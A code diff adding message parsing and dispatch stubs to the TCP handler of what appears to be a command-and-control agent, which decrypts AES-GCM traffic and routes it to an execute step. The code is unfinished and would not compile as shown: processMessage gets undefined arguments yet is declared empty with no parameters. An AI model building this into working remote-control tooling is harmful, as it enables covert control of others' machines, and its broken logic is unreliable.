@@ -11,6 +11,7 @@
 #include "C2Profile.h"
 #include "encoders/decode.h"
 #include "cryptography/decrypt.h"
+#include "MessageHandler.h"
 
 /*
  * Order:
@@ -44,7 +45,11 @@ int handleTCP(uint8_t* rawData, size_t rawDataLength, Config* config)  // TODO: 
 	const uint8_t* ciphertext = rawData + 12;
 	size_t ciphertext_len = rawDataLength - 12 - 16;
 	const uint8_t* tag = rawData + 12 + ciphertext_len;
-	decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf);
+	int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size
+
+	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
+	// parseHeader()
+	// check if sizeof(MessageHeader) + header->payloadSize == decrypted_size, otherwise throw error
 
 	// DESERIALIZE -> InternalMessage 
 	// check length(plaintext) == sizeof(InternalMessage)
@@ -53,10 +58,12 @@ int handleTCP(uint8_t* rawData, size_t rawDataLength, Config* config)  // TODO: 
     // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
     // check length(plaintext) == expected_size
 
-	// VALIDATE
 
 	// EXECUTE (InternalMessage)
 	// call function based on InternalMessage
+	processMessage(payload, header); // TODO: check return type for errors?
+
+	// TODO: cleanup/free buf
 }
 
 
@@ -83,4 +90,10 @@ int handleHTTPS(uint8_t* data)
 
 }
 
+// this function processes the header of the message
+// to determine how to interpet the contents/data of 
+// the message. 
+int processMessage()
+{
 
+}
